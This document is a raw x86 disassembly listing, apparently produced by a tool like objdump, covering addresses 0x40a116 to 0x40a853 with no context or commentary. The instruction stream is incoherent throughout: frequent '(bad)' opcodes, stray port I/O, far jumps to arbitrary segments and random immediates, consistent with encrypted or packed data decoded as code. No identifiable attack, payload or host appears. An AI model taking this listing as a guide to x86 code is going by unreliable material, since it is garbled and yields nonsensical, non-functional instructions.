  40a116:	push   0x2b2ab3e9
  40a11b:	scas   eax,DWORD PTR es:[edi]
  40a11c:	dec    esp
  40a11d:	mov    ds:0x85c042af,eax
  40a122:	aaa    
  40a123:	retf   0x7072
  40a126:	cmp    al,0x2b
  40a128:	ja     0x40a125
  40a12a:	and    bl,BYTE PTR [ecx+edi*4]
  40a12d:	sub    ah,bh
  40a12f:	xchg   esi,eax
  40a130:	mov    bl,0x11
  40a132:	inc    edi
  40a133:	stos   BYTE PTR es:[edi],al
  40a134:	lahf   
  40a135:	pusha  
  40a136:	lods   eax,DWORD PTR ds:[esi]
  40a137:	scas   al,BYTE PTR es:[edi]
  40a138:	je     0x40a0fd
  40a13a:	sti    
  40a13b:	adc    ah,al
  40a13d:	pusha  
  40a13e:	mov    esp,0x5cc1caf8
  40a143:	or     al,0xb
  40a145:	(bad)  ds:0x9d036caf
  40a14b:	cmp    eax,0xf0667cf6
  40a150:	inc    esi
  40a152:	pop    ebx
  40a153:	aad    0x15
  40a155:	imul   edx,DWORD PTR [edx-0x4a],0xffffffa9
  40a159:	lea    eax,[edi]
  40a15b:	scas   al,BYTE PTR es:[edi]
  40a15c:	(bad)  
  40a15d:	mov    cl,0x5d
  40a15f:	jo     0x40a0f6
  40a161:	scas   eax,DWORD PTR es:[edi]
  40a162:	(bad)  
  40a164:	fld    DWORD PTR [ebp-0x33]
  40a167:	push   edi
  40a168:	pop    es
  40a169:	add    DWORD PTR ds:0xe4aa68c1,eax
  40a16f:	les    eax,FWORD PTR [esi]
  40a171:	je     0x40a1dc
  40a173:	jbe    0x40a141
  40a175:	test   al,0x7e
  40a177:	jb     0x40a19c
  40a179:	stos   BYTE PTR es:[edi],al
  40a17a:	(bad)  
  40a17b:	ret    
  40a17c:	popa   
  40a17d:	test   BYTE PTR [ecx+0x7b],dh
  40a180:	jo     0x40a1e8
  40a182:	into   
  40a183:	push   es
  40a184:	test   bl,bh
  40a186:	scas   al,BYTE PTR es:[edi]
  40a187:	dec    esi
  40a188:	inc    edi
  40a189:	ret    
  40a18a:	and    eax,0xe56956e2
  40a18f:	dec    ebp
  40a190:	mov    dh,0xab
  40a192:	loop   0x40a1d7
  40a194:	mov    eax,ds:0x9731dc0b
  40a199:	mov    dl,0x16
  40a19b:	cmp    dh,BYTE PTR [edi]
  40a19d:	cmp    al,dl
  40a19f:	mov    ch,0xef
  40a1a1:	mov    edi,0xef618da3
  40a1a6:	inc    ebp
  40a1a7:	xlat   BYTE PTR ds:[ebx]
  40a1a8:	retf   
  40a1a9:	repnz hlt 
  40a1ab:	sbb    edi,DWORD PTR [edx-0xf3bf85a]
  40a1b1:	and    bl,cl
  40a1b3:	fbld   TBYTE PTR [ecx]
  40a1b5:	xchg   DWORD PTR es:[eax],esp
  40a1b8:	repz or BYTE PTR [ebx+0x1f16315c],ch
  40a1bf:	sbb    al,0x76
  40a1c1:	cmc    
  40a1c2:	cmp    al,0x3b
  40a1c4:	rol    BYTE PTR [edi+0x70],0xca
  40a1c8:	popa   
  40a1c9:	sub    eax,0x41999748
  40a1ce:	and    al,BYTE PTR [ebp+ecx*4+0x77]
  40a1d2:	mov    edi,0xb186cc3b
  40a1d7:	dec    edi
  40a1d8:	rol    ch,1
  40a1da:	lods   eax,DWORD PTR ds:[esi]
  40a1db:	jae    0x40a16d
  40a1dd:	xchg   edi,eax
  40a1de:	imul   edi,DWORD PTR [edi+0x50dd249f],0x31f9f8b9
  40a1e8:	jecxz  0x40a1f6
  40a1ea:	cwde   
  40a1eb:	jge    0x40a204
  40a1ed:	(bad)  [ecx-0x59e397ca]
  40a1f3:	add    bl,cl
  40a1f5:	add    edx,DWORD PTR [ebx]
  40a1f7:	inc    ebx
  40a1f8:	add    BYTE PTR [esi+0x72],bl
  40a1fb:	cmp    esp,esi
  40a1fd:	cmp    ah,dl
  40a1ff:	sahf   
  40a200:	mov    eax,ds:0xd47f79ce
  40a205:	into   
  40a206:	out    0x71,eax
  40a208:	ss mov bl,0xd8
  40a20b:	cmp    BYTE PTR [ebx+0x5e],ch
  40a20e:	xor    cl,BYTE PTR [eax+0x4cff9db7]
  40a214:	push   es
  40a215:	arpl   WORD PTR [ebp+0x67bed7db],dx
  40a21b:	adc    esi,eax
  40a21d:	push   0xffffffe3
  40a21f:	and    al,0xaf
  40a221:	in     al,0x36
  40a223:	sub    edx,DWORD PTR [eax-0xd]
  40a226:	dec    eax
  40a227:	mov    bh,0x48
  40a229:	cmp    DWORD PTR [esi],ebp
  40a22b:	cmp    esp,eax
  40a22d:	mov    eax,ds:0x6b11f029
  40a232:	out    0x45,eax
  40a234:	push   0x2d
  40a236:	dec    ebp
  40a237:	xlat   BYTE PTR ds:[ebx]
  40a238:	pop    esp
  40a239:	scas   eax,DWORD PTR es:[edi]
  40a23a:	retf   0x1bd1
  40a23d:	stc    
  40a23e:	aaa    
  40a23f:	dec    ecx
  40a240:	inc    esi
  40a241:	(bad)  
  40a242:	mov    edx,0x614d37e7
  40a247:	jo     0x40a1ec
  40a249:	cmp    DWORD PTR [esi+0x2a],edx
  40a24c:	ret    0x1dd7
  40a24f:	popf   
  40a250:	cmc    
  40a251:	sar    BYTE PTR [edx+0x10994b0e],1
  40a257:	js     0x40a261
  40a259:	ins    DWORD PTR es:[edi],dx
  40a25a:	adc    dl,dh
  40a25c:	cmp    edi,DWORD PTR [ecx-0x3]
  40a25f:	add    DWORD PTR [ebx],ebx
  40a261:	fmul   QWORD PTR [ecx]
  40a263:	pop    edx
  40a264:	mov    bl,0x60
  40a266:	jmp    0xc6c4:0xa6f66a6d
  40a26d:	jg     0x40a2cb
  40a26f:	push   ecx
  40a270:	outs   dx,DWORD PTR ds:[esi]
  40a271:	xchg   edx,eax
  40a272:	arpl   WORD PTR [ecx-0x67],cx
  40a275:	sub    al,0xd1
  40a278:	sub    bl,BYTE PTR [edx+0xa]
  40a27b:	xlat   BYTE PTR es:[ebx]
  40a27d:	pop    edi
  40a27e:	inc    edi
  40a27f:	jb     0x40a2f8
  40a281:	das    
  40a282:	retf   0x42ab
  40a285:	(bad)  
  40a286:	dec    ecx
  40a287:	or     ch,BYTE PTR [ecx-0x104d18d3]
  40a28d:	lds    esi,FWORD PTR [edx+0x6c06e097]
  40a293:	popa   
  40a294:	call   0x16c34c0d
  40a299:	and    eax,0x288eddc
  40a29e:	in     al,dx
  40a29f:	xor    al,BYTE PTR [ecx+0x216624cd]
  40a2a5:	lods   al,BYTE PTR ds:[esi]
  40a2a6:	cdq    
  40a2a7:	mov    al,ds:0x10bfd16e
  40a2ac:	fs cmp dl,ch
  40a2af:	in     eax,dx
  40a2b0:	test   al,0xda
  40a2b2:	aam    0xd9
  40a2b4:	adc    esp,DWORD PTR es:[eax-0x3868b4dd]
  40a2bb:	add    edi,esi
  40a2bd:	out    dx,eax
  40a2be:	inc    esi
  40a2bf:	mul    BYTE PTR [edi+0x28]
  40a2c2:	sub    eax,0x2bb21ea1
  40a2c7:	mov    ecx,esi
  40a2c9:	aam    0x94
  40a2cb:	scas   eax,DWORD PTR es:[edi]
  40a2cc:	cdq    
  40a2cd:	ins    DWORD PTR es:[edi],dx
  40a2ce:	mov    eax,0xf32e45d8
  40a2d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2d4:	mov    ch,0x58
  40a2d6:	jmp    0x5eb44ca7
  40a2db:	iret   
  40a2dc:	jp     0x40a2f7
  40a2de:	dec    esp
  40a2df:	dec    ecx
  40a2e0:	jnp    0x40a2d7
  40a2e2:	sbb    DWORD PTR [edx],esp
  40a2e4:	inc    ecx
  40a2e5:	push   edi
  40a2e6:	dec    eax
  40a2e7:	push   0x3d62d704
  40a2ec:	xor    ah,BYTE PTR ds:0x8fd5d07d
  40a2f2:	pop    edx
  40a2f3:	sar    bl,cl
  40a2f5:	dec    edx
  40a2f6:	stc    
  40a2f7:	(bad)  
  40a2f8:	scas   eax,DWORD PTR es:[edi]
  40a2f9:	push   edi
  40a2fa:	dec    esp
  40a2fb:	mov    ebp,0xcd446ff4
  40a300:	sub    DWORD PTR [edx-0x46ca2570],ebx
  40a306:	mov    ecx,0x5acc4df
  40a30b:	cmp    al,0xd8
  40a30d:	retf   0x9c89
  40a310:	(bad)  
  40a311:	imul   edx,DWORD PTR [edx+0x55],0xffffffa3
  40a315:	mov    ch,0x5a
  40a317:	xor    BYTE PTR [edi+0x402e1632],cl
  40a31d:	das    
  40a31e:	pop    edx
  40a31f:	and    eax,DWORD PTR [ecx-0x3a75042f]
  40a325:	hlt    
  40a326:	dec    ebp
  40a327:	mov    ss:0x6cbaaece,eax
  40a32d:	stc    
  40a32e:	pop    edi
  40a32f:	pop    es
  40a330:	mov    dh,0x77
  40a332:	push   0x78766c37
  40a337:	pop    ss
  40a338:	mov    al,ds:0xd27f14a2
  40a33d:	test   eax,0xf518583c
  40a342:	ss mov ecx,0xade864da
  40a348:	or     al,0xc4
  40a34a:	lahf   
  40a34b:	inc    edx
  40a34c:	push   edi
  40a34d:	push   ecx
  40a34e:	(bad)  
  40a34f:	cmc    
  40a350:	jne    0x40a393
  40a352:	dec    edi
  40a353:	fnstsw WORD PTR [ecx]
  40a355:	ins    BYTE PTR es:[edi],dx
  40a356:	cmp    bl,cl
  40a358:	inc    ecx
  40a359:	pop    edx
  40a35a:	sub    esi,ecx
  40a35c:	(bad)  
  40a35d:	fild   DWORD PTR [edi+0x63a7ce40]
  40a363:	jl     0x40a33b
  40a365:	pop    ss
  40a366:	jmp    0x40a2f1
  40a368:	ror    BYTE PTR [ebp+ebx*8-0x8],1
  40a36c:	xchg   ecx,eax
  40a36d:	daa    
  40a36e:	xchg   DWORD PTR [edi+0x12cdaabb],edi
  40a374:	inc    edi
  40a375:	pop    esi
  40a376:	sbb    BYTE PTR [ecx+0x36b2cdc1],al
  40a37c:	lods   al,BYTE PTR ds:[esi]
  40a37d:	repnz lds eax,FWORD PTR [ecx-0x175535f9]
  40a384:	fild   QWORD PTR [ecx]
  40a386:	ficomp DWORD PTR [ecx+0x17759129]
  40a38c:	push   0xffffffec
  40a38e:	pop    es
  40a38f:	mov    BYTE PTR gs:[esi],bh
  40a392:	xchg   edx,eax
  40a393:	xor    al,0xe8
  40a395:	and    DWORD PTR [ecx+0x2a],ebp
  40a398:	push   edx
  40a399:	out    0x4,eax
  40a39b:	add    DWORD PTR [ecx],ecx
  40a39d:	iret   
  40a39e:	js     0x40a339
  40a3a0:	dec    ebx
  40a3a1:	out    0x83,eax
  40a3a3:	adc    BYTE PTR [edx+ecx*8-0x4d8d9ca4],cl
  40a3aa:	xchg   edx,eax
  40a3ab:	enter  0x347e,0xb7
  40a3af:	push   esi
  40a3b0:	cmp    esp,DWORD PTR [esi]
  40a3b2:	scas   al,BYTE PTR es:[edi]
  40a3b3:	dec    edx
  40a3b4:	sbb    dh,cl
  40a3b6:	adc    cl,BYTE PTR [ebx]
  40a3b8:	aam    0x5c
  40a3ba:	push   esi
  40a3bb:	sbb    edx,esp
  40a3bd:	mov    al,ds:0xcbffba53
  40a3c2:	mov    ds:0xc85c0c3c,al
  40a3c7:	and    eax,0xdca946de
  40a3cc:	adc    al,0xa8
  40a3ce:	and    eax,0x18e7bef0
  40a3d3:	stos   BYTE PTR es:[edi],al
  40a3d4:	(bad)  [eax+0x20de7107]
  40a3da:	pop    esi
  40a3db:	(bad)  
  40a3dc:	inc    edi
  40a3dd:	adc    DWORD PTR [esi+edx*2-0x48f90b56],esi
  40a3e4:	sti    
  40a3e5:	(bad)  
  40a3e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3e7:	sbb    BYTE PTR [edi+0xa3a813],0xa3
  40a3ee:	mov    ecx,DWORD PTR [edx+0x77]
  40a3f1:	in     al,0xdc
  40a3f3:	ss inc esp
  40a3f5:	int3   
  40a3f6:	sbb    ebp,eax
  40a3f8:	clc    
  40a3f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3fa:	jbe    0x40a45b
  40a3fc:	inc    eax
  40a3fd:	mov    eax,ds:0x955be5ae
  40a402:	neg    edi
  40a404:	and    BYTE PTR [ecx],bh
  40a406:	sbb    BYTE PTR [ecx],bl
  40a408:	ror    cl,cl
  40a40a:	xchg   esp,eax
  40a40b:	cmp    edx,DWORD PTR [ecx+0x3afdacb0]
  40a411:	jecxz  0x40a3e7
  40a413:	xor    edx,0x2f62e961
  40a419:	adc    eax,0x3980a064
  40a41e:	fadd   DWORD PTR [edx]
  40a420:	(bad)  [eax+0x49a7bf35]
  40a426:	add    dl,BYTE PTR [edx]
  40a428:	mov    al,ds:0x64223d7d
  40a42d:	and    DWORD PTR [esi+0x4a5a05e1],esp
  40a433:	mov    ?,WORD PTR [eax+0x61a6505]
  40a439:	xchg   esp,eax
  40a43a:	mov    ebp,0x36069775
  40a43f:	sti    
  40a440:	or     al,0x8a
  40a442:	into   
  40a443:	xor    al,0x65
  40a445:	in     eax,0x29
  40a447:	rcl    BYTE PTR [ecx+0x62f01d3b],cl
  40a44d:	sub    ah,cl
  40a44f:	inc    esp
  40a450:	stc    
  40a451:	mov    eax,ds:0x72a884f6
  40a456:	fsub   QWORD PTR fs:[edi-0x5bf1483b]
  40a45d:	rcl    ah,1
  40a45f:	xchg   ebx,eax
  40a460:	dec    ecx
  40a461:	sar    DWORD PTR [edi],0xec
  40a464:	pop    esi
  40a465:	jns    0x40a4e6
  40a467:	sar    BYTE PTR [eax-0x7f],1
  40a46a:	add    DWORD PTR [ecx+eax*1-0x6a9ce3ac],edi
  40a471:	div    bh
  40a473:	and    BYTE PTR [edx-0x8],0x7
  40a477:	dec    eax
  40a478:	repnz pop ecx
  40a47a:	mov    cl,0x6c
  40a47c:	js     0x40a42e
  40a47e:	popf   
  40a47f:	fldcw  WORD PTR [ebx]
  40a481:	sub    al,0x40
  40a483:	pop    esp
  40a484:	push   esp
  40a485:	mov    ecx,0x87ab5cff
  40a48a:	jne    0x40a4e5
  40a48c:	arpl   WORD PTR [edi-0x12],bx
  40a48f:	into   
  40a490:	jle    0x40a4ea
  40a492:	and    DWORD PTR [ebx+esi*8],ecx
  40a495:	scas   eax,DWORD PTR es:[edi]
  40a496:	push   ebp
  40a497:	push   ebp
  40a498:	mov    ebp,0x3ac7e870
  40a49d:	retf   0xd0bf
  40a4a0:	lds    esp,FWORD PTR [esi]
  40a4a2:	add    al,0x94
  40a4a4:	ret    0x2934
  40a4a7:	lods   al,BYTE PTR ds:[esi]
  40a4a8:	mov    ebx,0x5aa2c1dd
  40a4ad:	test   DWORD PTR [ebx-0x7b51bc87],ebp
  40a4b3:	jmp    0xca5f:0x14602a31
  40a4ba:	pop    edx
  40a4bc:	inc    esp
  40a4bd:	repz adc ch,BYTE PTR [ebx+edx*4]
  40a4c1:	test   BYTE PTR [edx+0x23],dh
  40a4c4:	mov    al,ds:0xcecad3f0
  40a4c9:	adc    ebp,0xdb5c41b4
  40a4cf:	rcl    cl,cl
  40a4d1:	xchg   ecx,eax
  40a4d2:	fadd   QWORD PTR [ebx]
  40a4d4:	ret    0xbc11
  40a4d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4d8:	mov    bh,0xb4
  40a4da:	lods   eax,DWORD PTR ds:[esi]
  40a4db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a4dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4dd:	jg     0x40a464
  40a4df:	aaa    
  40a4e0:	fcom   DWORD PTR [ecx-0x72bec5a7]
  40a4e6:	dec    ebx
  40a4e7:	push   eax
  40a4e8:	outs   dx,BYTE PTR ds:[esi]
  40a4e9:	push   ds
  40a4ea:	mov    ebx,0x2b90048d
  40a4ef:	adc    esp,esi
  40a4f1:	or     ebx,DWORD PTR [edi]
  40a4f3:	clc    
  40a4f4:	es repnz out 0x75,eax
  40a4f8:	adc    eax,0xa4b83d6d
  40a4fd:	imul   esi,esp,0xffffffa2
  40a500:	push   ebp
  40a501:	cmp    ebx,DWORD PTR [esi]
  40a503:	sub    DWORD PTR [ebx],ebp
  40a505:	fidivr DWORD PTR [ecx-0x652adc8a]
  40a50b:	fistp  DWORD PTR [eax+ebp*8-0x46eaddc4]
  40a512:	scas   al,BYTE PTR es:[edi]
  40a513:	jns    0x40a52e
  40a515:	dec    esp
  40a516:	call   0x70fb906e
  40a51b:	jmp    0x1c872c7d
  40a520:	mov    al,ds:0x992fe5c4
  40a525:	jl     0x40a576
  40a527:	pop    eax
  40a528:	out    0x31,al
  40a52a:	scas   eax,DWORD PTR es:[edi]
  40a52b:	ffreep st(5)
  40a52d:	ins    BYTE PTR es:[edi],dx
  40a52e:	(bad)  
  40a52f:	and    esp,DWORD PTR [eax]
  40a531:	add    eax,DWORD PTR [eax]
  40a533:	and    dl,BYTE PTR [ebx-0x213e396a]
  40a539:	in     eax,dx
  40a53a:	stc    
  40a53b:	pop    ds
  40a53c:	cmp    bh,bl
  40a53e:	nop
  40a53f:	jg     0x40a575
  40a541:	jb     0x40a4ec
  40a543:	pshufw mm7,QWORD PTR [edx+0x45],0x37
  40a548:	sbb    cl,ch
  40a54a:	outs   dx,DWORD PTR ds:[esi]
  40a54b:	and    bh,BYTE PTR [ebp+0x33]
  40a54e:	and    BYTE PTR [ebx],0xcf
  40a551:	xchg   edx,eax
  40a552:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a553:	pop    ss
  40a554:	and    eax,0x9a8fa63a
  40a559:	ins    DWORD PTR es:[edi],dx
  40a55a:	sbb    bl,dl
  40a55c:	adc    eax,0xce830261
  40a561:	xchg   esi,eax
  40a562:	and    esi,ecx
  40a564:	adc    dl,BYTE PTR [ebp-0x63]
  40a567:	cwde   
  40a568:	xor    al,0xcd
  40a56a:	sar    DWORD PTR [ebp+ecx*8+0x961dc6],0xb8
  40a572:	dec    ebp
  40a573:	add    eax,0xca9c325f
  40a578:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a579:	in     al,0xe6
  40a57b:	rcl    esp,1
  40a57d:	lea    ebx,[ecx+esi*4+0x6009d252]
  40a584:	stos   DWORD PTR es:[edi],eax
  40a585:	repz push cs
  40a587:	int3   
  40a588:	mov    eax,ds:0xfd39fbb
  40a58d:	loop   0x40a52b
  40a58f:	fisubr DWORD PTR [esi+0x6a]
  40a592:	add    edi,DWORD PTR [ebp+esi*4+0x4e]
  40a596:	cs and bl,bh
  40a599:	sbb    al,bl
  40a59b:	out    dx,eax
  40a59c:	xchg   ebp,eax
  40a59d:	dec    DWORD PTR [ebx-0x64]
  40a5a0:	sbb    ebx,DWORD PTR [esp+eax*4]
  40a5a3:	and    ch,BYTE PTR [ebx+0x37]
  40a5a6:	into   
  40a5a7:	test   eax,0x8fdcb685
  40a5ac:	(bad)  
  40a5ae:	xchg   ebp,eax
  40a5af:	or     ecx,esi
  40a5b1:	cmc    
  40a5b2:	or     al,0x14
  40a5b4:	and    DWORD PTR [ebp-0x2016ec2c],esi
  40a5ba:	inc    DWORD PTR [esi+ebp*1]
  40a5bd:	(bad)  
  40a5be:	cmp    bl,dl
  40a5c0:	pop    esp
  40a5c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5c2:	fist   WORD PTR [edx+0x5c46df87]
  40a5c8:	jbe    0x40a622
  40a5ca:	or     ah,BYTE PTR [ebp+0x19]
  40a5cd:	or     ch,ch
  40a5cf:	int    0x43
  40a5d1:	in     eax,dx
  40a5d2:	and    DWORD PTR [esi-0x63],eax
  40a5d5:	mov    ch,0xb6
  40a5d7:	out    dx,eax
  40a5d8:	imul   esi,DWORD PTR [esi+eax*4],0x8de4b9d9
  40a5df:	xlat   BYTE PTR fs:[ebx]
  40a5e1:	fsubr  QWORD PTR [ecx+eiz*8-0x7f]
  40a5e5:	mov    bh,0x6d
  40a5e7:	popf   
  40a5e8:	ret    0x53b7
  40a5eb:	leave  
  40a5ec:	std    
  40a5ed:	(bad)  
  40a5ef:	adc    eax,ebx
  40a5f1:	mov    eax,0x2238cc7
  40a5f6:	cmp    bl,BYTE PTR [ecx+0x706ce43a]
  40a5fc:	cld    
  40a5fd:	mov    ebx,0x9dad12c3
  40a602:	jae    0x40a663
  40a604:	inc    ebx
  40a605:	ins    BYTE PTR es:[edi],dx
  40a606:	or     ah,BYTE PTR [esi-0x60]
  40a609:	cmp    edi,eax
  40a60b:	popf   
  40a60c:	mov    al,0xf1
  40a60e:	dec    ebp
  40a60f:	jp     0x40a5af
  40a611:	pusha  
  40a612:	sub    ecx,DWORD PTR [edx]
  40a614:	call   0xfce2e69f
  40a619:	jne    0x40a647
  40a61b:	fld    QWORD PTR [edx]
  40a61d:	pop    ds
  40a61e:	sar    BYTE PTR [esi+0x643cdc4f],0x56
  40a625:	lahf   
  40a626:	shr    DWORD PTR [ebx+edx*4+0x4d974801],1
  40a62d:	out    0xdf,eax
  40a62f:	in     al,0x26
  40a631:	push   0x60
  40a633:	cmp    eax,0xf0758cfb
  40a638:	in     eax,0xfc
  40a63a:	fld    QWORD PTR [esi-0x53]
  40a63d:	adc    bl,bl
  40a63f:	ret    0xb0c0
  40a642:	sbb    eax,0x1997e46
  40a647:	push   ds
  40a648:	or     eax,ebx
  40a64a:	jmp    0xdde7:0x872910fb
  40a651:	addr16 pusha 
  40a653:	push   ss
  40a654:	jo     0x40a6c6
  40a656:	ins    DWORD PTR es:[edi],dx
  40a657:	stos   DWORD PTR es:[edi],eax
  40a658:	adc    ah,BYTE PTR [ebx+0x30d35641]
  40a65e:	lods   eax,DWORD PTR ds:[esi]
  40a65f:	in     eax,0xbd
  40a661:	dec    ecx
  40a662:	xlat   BYTE PTR ds:[ebx]
  40a663:	jmp    0x7956:0x69bc5f7a
  40a66a:	cs push esp
  40a66c:	jg     0x40a6c0
  40a66e:	mov    bl,0x88
  40a670:	ret    
  40a671:	dec    ebp
  40a672:	pop    edi
  40a673:	ret    0xa858
  40a676:	mov    ds:0xfa1fc9cb,eax
  40a67b:	sbb    BYTE PTR [eax+edi*1+0x2f],cl
  40a67f:	inc    ebp
  40a680:	push   ebp
  40a681:	popa   
  40a682:	mov    eax,?
  40a684:	add    esi,edx
  40a686:	and    al,0x77
  40a688:	jb     0x40a6c1
  40a68a:	mov    ?,WORD PTR [ebp-0x94396e7]
  40a690:	je     0x40a6aa
  40a692:	jae    0x40a6f4
  40a694:	or     esi,DWORD PTR [esi]
  40a696:	pop    ebx
  40a697:	pop    esi
  40a698:	cmp    edx,esp
  40a69a:	lods   eax,DWORD PTR ds:[esi]
  40a69c:	retf   0xc4fb
  40a69f:	data16 adc BYTE PTR [esi+0x41bac75f],0x5a
  40a6a7:	call   FWORD PTR [edx+0x58]
  40a6aa:	push   ebx
  40a6ab:	lock dec eax
  40a6ad:	or     ch,ch
  40a6af:	xchg   DWORD PTR [esi+0xb686169],eax
  40a6b5:	repz (bad) 
  40a6b7:	ins    BYTE PTR es:[edi],dx
  40a6b8:	xor    al,0x74
  40a6ba:	arpl   di,dx
  40a6bc:	adc    ebx,esi
  40a6be:	jmp    esi
  40a6c0:	mov    esi,0xc9ba2f4
  40a6c5:	or     al,0x1f
  40a6c7:	fs (bad) 
  40a6c9:	jl     0x40a694
  40a6cb:	retf   
  40a6cc:	mov    esp,0xd0d1125
  40a6d1:	inc    edx
  40a6d2:	cmp    al,ah
  40a6d4:	les    esp,FWORD PTR [edi+eax*2]
  40a6d7:	imul   esp,DWORD PTR [edi+0x131bb5e0],0x4075f06d
  40a6e1:	(bad)  
  40a6e2:	jno    0x40a75f
  40a6e4:	push   0x4
  40a6e6:	mov    ?,ebx
  40a6e8:	jg     0x40a745
  40a6ea:	lock std 
  40a6ec:	out    0xf7,eax
  40a6ee:	cli    
  40a6ef:	out    dx,al
  40a6f0:	stc    
  40a6f1:	retf   0xb6a5
  40a6f4:	loop   0x40a765
  40a6f6:	and    ch,ah
  40a6f8:	cmp    al,0x79
  40a6fa:	push   eax
  40a6fb:	loop   0x40a748
  40a6fd:	rcr    BYTE PTR [bp-0x69],1
  40a701:	pop    esp
  40a702:	lock scas eax,DWORD PTR es:[edi]
  40a704:	loopne 0x40a68d
  40a706:	lock out 0x59,al
  40a709:	mov    edi,0xe650609b
  40a70e:	fadd   QWORD PTR [edi+0x73342582]
  40a714:	test   eax,0x8a9058f4
  40a719:	adc    al,0x49
  40a71b:	sbb    eax,0xcef4f1fe
  40a720:	leave  
  40a721:	add    ebp,DWORD PTR [edx]
  40a723:	sahf   
  40a724:	cmp    al,0xe2
  40a726:	xchg   BYTE PTR [edx-0x22],dh
  40a729:	nop
  40a72a:	cmp    al,0xfd
  40a72c:	push   es
  40a72d:	pushf  
  40a72e:	stos   DWORD PTR es:[edi],eax
  40a72f:	test   DWORD PTR [esi-0x7e1fd27],ebp
  40a735:	and    bl,dh
  40a737:	push   es
  40a738:	mov    al,0x7a
  40a73a:	xor    BYTE PTR [edx],cl
  40a73c:	cmp    ebx,DWORD PTR ds:0xe1bd6971
  40a742:	push   edx
  40a743:	mov    ds:0x8a411265,eax
  40a748:	sub    bh,dh
  40a74a:	out    dx,al
  40a74b:	pop    ecx
  40a74c:	out    0xea,al
  40a74e:	dec    ebp
  40a74f:	fcompp 
  40a751:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a752:	adc    eax,0xe9f00964
  40a757:	and    edi,DWORD PTR [ebp+0x6c939ab0]
  40a75d:	or     al,0xb9
  40a75f:	xchg   ecx,eax
  40a760:	lods   eax,DWORD PTR ds:[esi]
  40a761:	test   al,dh
  40a763:	xlat   BYTE PTR ds:[ebx]
  40a764:	clc    
  40a765:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a766:	cmp    DWORD PTR [edi+0x7c],edi
  40a769:	(bad)  
  40a76a:	adc    edx,DWORD PTR [ebx+0xaa423d3]
  40a770:	ficomp WORD PTR [edx-0x30]
  40a773:	xchg   edi,eax
  40a774:	retf   0xbcf4
  40a777:	outs   dx,BYTE PTR ds:[esi]
  40a778:	ins    DWORD PTR es:[edi],dx
  40a779:	cmp    dh,bh
  40a77b:	mov    eax,DWORD PTR [ecx]
  40a77d:	push   es
  40a77e:	sbb    eax,DWORD PTR [edx+eax*4]
  40a781:	pop    ebx
  40a782:	(bad)  
  40a783:	sbb    al,al
  40a785:	jg     0x40a7ad
  40a787:	scas   eax,DWORD PTR es:[edi]
  40a788:	cmp    al,0xbd
  40a78a:	sub    ah,bl
  40a78c:	fmul   st(0),st
  40a78e:	adc    dh,BYTE PTR [ebx]
  40a790:	dec    eax
  40a791:	sub    BYTE PTR [edx+0x7d02c54b],bl
  40a797:	jnp    0x40a7b0
  40a799:	data16 data16 cld 
  40a79c:	mov    ecx,esp
  40a79e:	mov    edi,0x6382a3cc
  40a7a3:	xor    DWORD PTR [ecx+0x1],ebx
  40a7a6:	div    BYTE PTR [ebx-0x14be64f4]
  40a7ac:	stos   DWORD PTR es:[edi],eax
  40a7ad:	fwait
  40a7ae:	fs (bad) 
  40a7b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7b1:	push   cs
  40a7b2:	xor    ecx,0x27
  40a7b5:	int3   
  40a7b6:	popf   
  40a7b7:	ror    bl,1
  40a7b9:	js     0x40a74e
  40a7bb:	sbb    edx,DWORD PTR [ecx+0x6c]
  40a7be:	mov    al,ds:0x6a605637
  40a7c3:	mov    al,0x25
  40a7c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7c6:	je     0x40a783
  40a7c8:	xor    DWORD PTR [ebx-0x57a48957],ebp
  40a7ce:	sub    eax,0x12f93f5c
  40a7d3:	pop    ecx
  40a7d4:	es cmp al,0x2e
  40a7d7:	add    al,0x5
  40a7d9:	sbb    esi,DWORD PTR [esi+0x18f4de39]
  40a7df:	iret   
  40a7e0:	outs   dx,DWORD PTR ds:[esi]
  40a7e1:	push   es
  40a7e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a7e3:	lods   al,BYTE PTR ds:[esi]
  40a7e4:	and    eax,0xf2fe0f5c
  40a7e9:	(bad)  
  40a7ea:	mov    ecx,0x12c7c84a
  40a7ef:	and    BYTE PTR [ebx+0x5e93fe36],bl
  40a7f5:	push   0xffffff94
  40a7f7:	sub    BYTE PTR [edi-0x74],al
  40a7fa:	test   al,0x95
  40a7fc:	mov    edi,0x2dcdce07
  40a801:	jbe    0x40a86c
  40a803:	fs das 
  40a805:	or     eax,DWORD PTR [ecx]
  40a807:	sub    al,0xd2
  40a809:	push   0xffffffc0
  40a80b:	ins    BYTE PTR es:[edi],dx
  40a80c:	or     edx,0x7ea5f6b2
  40a812:	ins    BYTE PTR es:[edi],dx
  40a813:	loope  0x40a894
  40a815:	cli    
  40a816:	jb     0x40a848
  40a818:	mov    ds:0x5eee35e5,al
  40a81d:	jae    0x40a83c
  40a81f:	das    
  40a820:	cmp    ch,BYTE PTR [edx-0xf]
  40a823:	xlat   BYTE PTR ds:[ebx]
  40a824:	adc    ecx,DWORD PTR [esi-0x7623aff8]
  40a82a:	cmp    BYTE PTR [edx],bl
  40a82c:	jns    0x40a807
  40a82e:	loop   0x40a7d9
  40a830:	cld    
  40a831:	fcom   DWORD PTR [ecx+0x79]
  40a834:	iret   
  40a835:	sti    
  40a836:	mov    eax,ds:0x173b93a
  40a83b:	sbb    al,0x67
  40a83d:	mov    bl,0x52
  40a83f:	icebp  
  40a840:	xlat   BYTE PTR ds:[ebx]
  40a841:	in     al,0xe0
  40a843:	cmp    esp,esi
  40a845:	imul   esp,DWORD PTR [eax+ebp*4],0xfffffff6
  40a849:	and    eax,0x9cb66c51
  40a84e:	cmovns esi,DWORD PTR [eax]
  40a851:	fdivp  st(5),st
  40a853:	adc    dl,dh
